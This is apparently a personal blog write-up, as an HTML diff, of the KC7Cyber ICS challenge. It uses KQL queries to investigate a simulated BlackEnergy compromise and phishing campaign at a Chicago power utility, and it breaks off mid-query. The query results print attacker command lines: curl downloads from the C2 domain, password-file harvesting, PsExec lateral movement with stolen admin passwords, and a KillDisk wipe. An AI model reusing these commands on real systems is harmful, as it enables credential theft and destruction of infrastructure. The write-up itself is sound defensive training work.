@@ -1,0 +1,1362 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - kc7cyber writeup - moderate - critical compromise in chicaco ics</title>
+    <link rel = "stylesheet" href = "../../../css/variables.css">
+    <link rel = "stylesheet" href = "../../../css/style.css">
+    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
+  </head>
+  <body id="top">
+    <div class="sidebar">
+      <header><!--website header-->
+        <h1>shoutvoid</h1>
+        <p>Aspiring cybersecurity professional</p>
+      </header><!--website header-->
+      <nav class="site-nav"> <!--site-wide navigation-->
+        <a href="../../../index.html">About</a>
+        <a href="../../writeups.html">Writeups</a>
+      </nav> <!--site-wide navigation-->
+      <nav class="page-nav" id="page-navigation"> <!--page navigation sidebar-->
+        <ol class="page-toc"><!--page toc-->
+          <a class="skip" href="#page-main">Skip to main content</a>
+          <li><a href="#intro">Introduction</a></li><!--link to intro-->
+          <li><a href=#sections>Sections</a><!--all sections-->
+            <ol class="section-toc"><!--section-toc-->
+              <li class="section1-toc"><!--individual section toc-->
+                <a href=#section1>Section 1 - SCADA NADA</a>
+              </li><!--individual section toc-->
+              <li class="section2-toc"><!--individual section toc-->
+                <a href=#section2>Section 2 - Phish and Chips</a>
+              </li><!--individual section toc-->
+            </ol><!--section-toc-->
+          </li><!--all sections-->
+        </ol> <!--page-toc class-->
+      </nav> <!--page navigation sidebar-->
+      <footer><!--website footer-->
+        <p>Made with vanilla HTML + CSS by shoutvoid</p>
+        <address>
+          <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+          <a href="https://github.com/ShoutVoid">GitHub</a>
+          <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+          <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+        </address>
+      </footer><!--website footer-->
+    </div>
+    <main id="page-main"> <!--main page content-->
+      <article id="intro"> <!--introduction-->
+        <h1>Critical Compromise in Chicago - ICS</h1>
+        <p>One of KC7Cyber's moderate challenges, it has the player take on the role of a cybersecurity researcher investigating a mysterious, widespread power outage on the day of one of the nation's most important cybersecurity conferences--which is rumored to be caused by a cyberattack against the city's critical infrastructure.</p>
+      </article> <!--introduction-->
+      <article id=sections><!--the game sections-->
+        <h2>Sections</h2>
+        <section id="section1"><!--section 1-->
+          <h3>Section 1 - SCADA NADA</h3>
+          <p>Having access to the power plant's system logs, I start by checking if there are any signs of abnormal processes re: the SCADA (supervisory control and data acquisition) systems.</p>
+          <pre><kbd>ProcessEvents
+| where process_commandline has "SCADA"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-09-09 11:17:44.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt</td>
+                    <td>cmd.exe</td>
+                    <td>462a705acf1baad147fe968adcb43d7b55ed40d7f7f5ac98c170d2bb517ee77b</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 03:43:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt</td>
+                    <td>cmd.exe</td>
+                    <td>ab08a7e519afdd3ed06d07f355b1c913bf79d2fc6538a108ccacf6db2b7d9eff</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:01:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe")</td>
+                    <td>cmd.exe</td>
+                    <td>d21027cfcbd6aad25f8c547149d9a9a8471405d5e5c93d576b0dfd81114d36f3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:08:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\BlackEnergy.exe &amp;&amp; \\%i\\ProgramData\\SCADA_Malicious_Commands.txt")</td>
+                    <td>cmd.exe</td>
+                    <td>4ab11d499060aa39d7d5e21fad3f072b3781ca13d3fff400c797a09dc00ff889</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:41:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe")</td>
+                    <td>cmd.exe</td>
+                    <td>80271c9ee2c2c346780b79fafe36ae1067cd360381130a950cc36ff37f22dd7e</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>For better or worse, I immediately find evidence of tampering. An executable named <samp>blackenergy.exe</samp> is executed and in turn runs <samp>ICSScanner.exe</samp> to gather all IP addresses belonging SCADA systems in the power plant's network; afterwards, it uses <samp>cURL</samp> to download a text file containing malicious commands to execute (<samp>SCADA_Malicious_Commands.txt</samp>) off an attacker-controlled server (<samp>http://chicagogridupdates.com</samp>). There are, evidently, missing processes in these results; at a certain point, the attackers also obtained the administrator passwords for each SCADA device (<samp>Extracted_Password.txt</samp>) and used them, along with the legitimate utility <samp>PsExec</samp> to execute actions such as spreading <samp>blackenergy.exe</samp> through all SCADA devices, to execute the previously-downloaded command list in each device, and to execute <samp>KillDisk.exe</samp>--whose name implies it's a disk wiping utility.</p>
+          <p>PsExec is a legitiamate Sysinternals tool. <quote>PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.</quote> [<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">Microsoft Learn</a>]</p>
+          <p>All commands were executed on hostname <samp>BDC0-DESKTOP</samp>, belonging to user <samp>jisaetang</samp> (SCADA Operator Jibby Saetang).</p>
+          <p>BlackEnergy has something of an storied history; initially (c. 2007) malware used for DDoS attacks [see <a href="https://web.archive.org/web/20200221013253/http://atlas-public.ec2.arbor.net/docs/BlackEnergy+DDoS+Bot+Analysis.pdf">Jose Nazario's analysis</a>], its most recent iteration (BE3) has much more advanced capabilities, and was famously used by the Russian APT Sandworm (a.k.a. Voodoo Bear, APT44, Seashell Blizzard) in the 2015 Ukrainian power grid hack. The CISA published an advisory at the time: <a href="https://www.cisa.gov/news-events/ics-alerts/ir-alert-h-16-056-01">ICS Alert - Cyber-Attack Against Ukrainian Critical Infrastructure</a>; and the incident--naturally--garnered news coverage: <a href="https://www.wired.com/2016/03/inside-cunning-unprecedented-hack-ukraines-power-grid/">Inside the Cunning, Unprecedented Hack of Ukraine's Power Grid</a> (among many).</p>
+          <p>Looking for more processes related to <samp>blackenergy.exe</samp>, I do the following:</p>
+          <pre><kbd>ProcessEvents
+| where * has "blackenergy.exe"</kbd></pre>
+          <details open id="results2">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-29 08:28:45.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>3eb1923ca66cb1120b777787181b90b2ea839120ea5474d66b9f60d74002da54</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>1624b5f54a285c08cacc24ddb7256ea082802f7934ccc142556c88800fb701ee</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 08:49:45.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24</td>
+                    <td>cmd.exe</td>
+                    <td>94886fa6ac36170d2648c6f86a6386625a61998706dae22569a34f770f087bde</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:16:29.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>1dde3d7372c1746d177e3dbd87dcd572fbc19ba618d29ba4352e2df8fa3f7a82</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>209c373fa7b5bce7ac12542f7838ee1a27bc721e5560736671deb45911aab130</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:17:29.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24</td>
+                    <td>cmd.exe</td>
+                    <td>09f401305faa04d1b9e3f66400741858e9ecde3e509ccf41df91f60ff20e5a9d</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-08 10:12:24.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl -o C:\ProgramData\ICSScanner.exe http://chicagogridupdates.com/ICSScanner.exe</td>
+                    <td>cmd.exe</td>
+                    <td>bbc985b4342c141e8111945ec1e79edbec2dc3f8bd9471601d7314b350b8a19a</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-09 11:17:44.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt</td>
+                    <td>cmd.exe</td>
+                    <td>462a705acf1baad147fe968adcb43d7b55ed40d7f7f5ac98c170d2bb517ee77b</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 02:18:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>dir /s /b C:\*password*.txt > C:\ProgramData\Password_Files.txt</td>
+                    <td>cmd.exe</td>
+                    <td>fe1c829b6270b386ac49a55de407d147ea49ec17dc83b173d93c5feddcdd633d</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 02:53:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1,2 delims=:' %i in (C:\ProgramData\Password_Files.txt) do findstr /I /M /C:"password" %i >> C:\ProgramData\Extracted_Password.txt</td>
+                    <td>cmd.exe</td>
+                    <td>77c83e68bee106401956a46b268e9b84d4b875b2def5454a6e7d0f6b2b256f78</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 03:43:57.0000</td>
+                    <td>blackenergy.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl -o C:\ProgramData\SCADA_Malicious_Commands.txt http://chicagogridupdates.com/SCADA_Malicious_Commands.txt</td>
+                    <td>cmd.exe</td>
+                    <td>ab08a7e519afdd3ed06d07f355b1c913bf79d2fc6538a108ccacf6db2b7d9eff</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:01:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe")</td>
+                    <td>cmd.exe</td>
+                    <td>d21027cfcbd6aad25f8c547149d9a9a8471405d5e5c93d576b0dfd81114d36f3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:08:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\BlackEnergy.exe &amp;&amp; \\%i\\ProgramData\\SCADA_Malicious_Commands.txt")</td>
+                    <td>cmd.exe</td>
+                    <td>4ab11d499060aa39d7d5e21fad3f072b3781ca13d3fff400c797a09dc00ff889</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>A slightly more complete picture emerges. It's first executed on 2024-08-29 at 08:28:45 and immediately after connects to the C&amp;C (or C2) server hosted at <samp>chicagogridupdates.com</samp>. The BlackEnergy executable uses curl to download <samp>ICSScanner.exe</samp> off <samp>chicagogridupdates.com</samp>. After scanning the network for SCADA devices and gathering all related IP addresses, the malware gathers all password files (stored in plaintext) and creates a single password list. These are the passwords that are then used to execute commands to spread and render the SCADA devices inoperable. The only traces of this malware across the entire network are in SCADA Operator Jibby Saetang's device.</p>
+          <p>Now, how did the malware get in his device to begin with? With this query we'll find the first instance of <samp>blackenergy.exe</samp> being written to disk.</p>
+          <pre><kbd>FileCreationEvents
+| where filename =~ "blackenergy.exe"</kbd></pre>
+          <details open id="results3">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                    <th>sha256</th>
+                    <th>path</th>
+                    <th>filename</th>
+                    <th>process_name</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-29 08:28:45.0000</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                    <td>1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:16:29.0000</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                    <td>dd053f38f5e60cd8750df450a13833c96d1285e78480323a54abab4a536f6317</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Interestingly, Jibby downloaded the malware twice, and slightly different versions at that (the sha256 hashes do not match). The first instance was at 2024-08-29 on 08:28:45 in the morning, at which point it executed immediately. The second instance was on 2024-08-29 at 10:16:29 in the morning, and it was also executed. From where did it come from? A malicious document?</p>
+          <pre><kbd>FileCreationEvents
+| where username =~ "jisaetang"
+| serialize
+| extend dropper = prev(filename)
+| where dropper !~ "blackenergy.exe"
+| where filename =~ "blackenergy.exe"</kbd></pre>
+          <details open id="results4">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                    <th>sha256</th>
+                    <th>path</th>
+                    <th>filename</th>
+                    <th>process_name</th>
+                    <th>dropper</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-29 08:28:45.0000</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                    <td>1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>explorer.exe</td>
+                    <td>Urgent_Cyber_Threat_Alert.zip</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 10:16:29.0000</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                    <td>dd053f38f5e60cd8750df450a13833c96d1285e78480323a54abab4a536f6317</td>
+                    <td>C:\ProgramDataBlackEnergy.exe</td>
+                    <td>BlackEnergy.exe</td>
+                    <td>explorer.exe</td>
+                    <td>Grid_Security_Update.zip</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>It came from a <samp>.zip</samp> file: <samp>Urgent_Cyber_Threat_Alert.zip</samp> and <samp>Grid_Security_Update.zip</samp> (since there are two <samp>blackenergy.exe</samp> files in Jibby's system). Given their filenames, it was likely a phishing attack. We'll explore this possibility in the following section.</p>
+        </section> <!--section 1-->
+        <section id="section2"><!--section 2-->
+          <h3>Section 2 - Phish and Chips</h3>
+          <p>Before investigating Jibby's emails and outbound connections, I'll briefly pivot back to the domain we know the threat actor used: <samp>chicagogridupdates.com</samp>.</p>
+          <pre><kbd>PassiveDns
+| where domain == "chicagogridupdates.com"
+| distinct ip</kbd></pre>
+          <details open id="results5">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>87.250.252.242</td>
+                  </tr>
+                  <tr>
+                    <td>104.244.42.129</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <pre><kbd>PassiveDns
+| where domain == "chicagogridupdates.com"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain</kbd></pre>
+          <details open id="results6">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>domain</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>chicagogridupdates.com</td>
+                  </tr>
+                  <tr>
+                    <td>citygridsolutions.net</td>
+                  </tr>
+                  <tr>
+                    <td>infrastructurewatch.org</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>The threat actors make use of IPs <samp>87.250.252.242</samp> and <samp>104.244.42.129</samp>, which are associated with the domains <samp>chicagogridupdates.com</samp>, <samp>citygridsolutions.net</samp> and <samp>infrastructurewatch.org</samp>. Another <samp>lookup</samp> fails to uncover any other unknown IPs or domains. We can move to examining emails:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "chicagogridupdates.com"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain;
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)</kbd></pre>
+          <details open id="results7">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-08-26 09:08:20.0000</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>elizabeth_nunmaker@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>SUSPICIOUS</td>
+                    <td>http://citygridsolutions.net/search/images/published/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 09:08:20.0000</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>tina_seburg@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>SUSPICIOUS</td>
+                    <td>http://citygridsolutions.net/search/images/published/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-26 09:08:20.0000</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>joseph_eisenman@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>SUSPICIOUS</td>
+                    <td>http://citygridsolutions.net/search/images/published/login.html</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 08:57:24.0000</td>
+                    <td>dissemblelebanon@aol.com</td>
+                    <td>sculpturalmintiest@protonmail.com</td>
+                    <td>nathaniel_wickings@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] FW: Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>https://chicagogridupdates.com/files/online/online/login?language=en</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-28 08:57:24.0000</td>
+                    <td>dissemblelebanon@aol.com</td>
+                    <td>sculpturalmintiest@protonmail.com</td>
+                    <td>katherine_jackson@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] FW: Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>https://chicagogridupdates.com/files/online/online/login?language=en</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 05:00:45.0000</td>
+                    <td>joseph_eisenman@chicagopowergrid.com</td>
+                    <td>joseph_eisenman@chicagopowergrid.com</td>
+                    <td>jibby_saetang@chicagopowergrid.com</td>
+                    <td>Critical: Grid Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>http://chicagogridupdates.com/published/public/files/images/Urgent_Cyber_Threat_Alert.zip</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 05:31:52.0000</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>steve_mcgrath@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] Critical: Grid Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>http://citygridsolutions.net/files/online/files/enter</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-29 06:14:35.0000</td>
+                    <td>elizabeth_nunmaker@chicagopowergrid.com</td>
+                    <td>elizabeth_nunmaker@chicagopowergrid.com</td>
+                    <td>jibby_saetang@chicagopowergrid.com</td>
+                    <td>Critical: Grid Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>http://chicagogridupdates.com/search/share/online/public/Grid_Security_Update.zip</td>
+                  </tr>
+                  <tr>
+                    <td>2024-08-30 08:46:01.0000</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>sculpturalmintiest@protonmail.com</td>
+                    <td>ralph_tyler@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] FW: Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>https://infrastructurewatch.org/images/files/share/search/login?language=en</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-02 08:21:32.0000</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>alissa_torres@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] RE:RE: Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>http://citygridsolutions.net/files/public/images/login?language=en</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-02 08:21:32.0000</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>jeff_foley@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] RE:RE: Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>http://citygridsolutions.net/files/public/images/login?language=en</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-04 02:45:18.0000</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>thresher_libero@hotmail.com</td>
+                    <td>david_siegel@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required</td>
+                    <td>CLEAN</td>
+                    <td>https://citygridsolutions.net/public/public/enter</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-05 08:30:13.0000</td>
+                    <td>chopping_asbestosis@verizon.com</td>
+                    <td>dissemblelebanon@aol.com</td>
+                    <td>betty_wagner@chicagopowergrid.com</td>
+                    <td>[EXTERNAL] RE: Critical: Grid Security Update Required</td>
+                    <td>CLEAN</td>
+                    <td>https://infrastructurewatch.org/published/published/public/signin</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Besides the unfortunate SCADA Operator Jibby Saetang, 11 other persons were targeted (Jibby twice). Most worryingly, Operations Manager Joseph Eisenman (<samp>joseph_eisenman@chicagopowergrid.com</samp>) and Network Administrator Elizabeth Nunmaker (<samp>elizabeth_nunmaker@chicagopowergrid.com</samp>) were both compromised, and had their email accounts used to deliver malware to Jibby Saetang.</p>
+          <p>Threat actor email addresses: <samp>thresher_libero@hotmail.com</samp>, <samp>dissemblelebanon@aol.com</samp>, <samp>chopping_asbestosis@verizon.com</samp> and <samp>sculpturalmintiest@protonmail.com</samp>.</p>
+          <p>Jibby Saetang was the only one who was sent any attachments; the others were sent false login pages to steal their credentials.</p>
+          <p>Targeted employees:</p>
+          <pre><kbd>let bad_domains =
+PassiveDns
+| where domain == "chicagogridupdates.com"
+| distinct ip
+| lookup PassiveDns on $left.ip == $right.ip
+| distinct domain;
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| where recipient endswith "chicagopowergrid.com"
+| distinct recipient
+| lookup Employees on $left.recipient == $right.email_addr
+| sort by role asc</kbd></pre>
+          <details open id="results8">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>role</th>
+                    <th>name</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>IT Administrator</td>
+                    <td>Tina Seburg</td>
+                  </tr>
+                  <tr>
+                    <td>IT Administrator</td>
+                    <td>Nathaniel Wickings</td>
+                  </tr>
+                  <tr>
+                    <td>IT Administrator</td>
+                    <td>David Siegel</td>
+                  </tr>
+                  <tr>
+                    <td>IT Administrator</td>
+                    <td>Betty Wagner</td>
+                  </tr>
+                  <tr>
+                    <td>Network Administrator</td>
+                    <td>Elizabeth Nunmaker</td>
+                  </tr>
+                  <tr>
+                    <td>Network Administrator</td>
+                    <td>Steve McGrath</td>
+                  </tr>
+                  <tr>
+                    <td>Network Administrator</td>
+                    <td>Jeff Foley</td>
+                  </tr>
+                  <tr>
+                    <td>Operations Manager</td>
+                    <td>Joseph Eisenman</td>
+                  </tr>
+                  <tr>
+                    <td>Operations Manager</td>
+                    <td>Katherine Jackson</td>
+                  </tr>
+                  <tr>
+                    <td>Operations Manager</td>
+                    <td>Ralph Tyler</td>
+                  </tr>
+                  <tr>
+                    <td>Operations Manager</td>
+                    <td>Alissa Torres</td>
+                  </tr>
+                  <tr>
+                    <td>SCADA Operator</td>
+                    <td>Jibby Saetang</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>All targeted employees were related to IT, SCADA or Operations more generally. I want to check which accounts were successfully accessed by the known malicious IPs; to do so, I use:</p>
+          <pre><kbd>let bad_ips =
+PassiveDns
